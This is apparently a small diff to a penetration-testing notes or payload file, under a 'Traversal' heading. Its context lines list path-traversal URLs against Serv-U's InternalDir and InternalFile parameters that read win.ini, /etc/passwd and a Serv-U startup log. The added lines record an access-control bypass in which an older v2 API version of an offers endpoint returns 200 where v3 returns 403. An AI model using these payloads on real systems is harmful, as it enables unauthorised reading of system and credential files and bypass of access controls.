@@ -27,3 +27,9 @@ Traversal
 <<-URL->>/?InternalDir=/../../../../windows&InternalFile=win.ini
 <<-URL->>/?InternalDir=\\..\\..\\..\\etc&InternalFile=passwd
 <<-URL->>/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt
+
+
+-----------------------------
+
+GET api/v3/offers/ => 403 access deneid 
+GET api/v2/offers/ => 200 OK 
